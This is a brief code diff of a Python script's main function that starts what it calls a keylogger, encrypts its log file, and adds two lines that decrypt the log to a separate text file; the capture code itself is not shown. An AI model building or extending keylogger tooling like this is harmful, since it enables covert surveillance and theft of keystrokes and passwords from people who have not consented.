@@ -71,6 +71,8 @@ def main():
         log_file = start_keylogger()
         print(f"Keylogger is running. Logs are being saved to {log_file}")
         encrypt_file(log_file)  
+        output_file = log_file + ".decrypted.txt"
+        decrypt_file(log_file, output_file)
     except Exception as e:
         logging.error(f"An error occurred: {e}")
         print("An error occurred while starting the keylogger.")
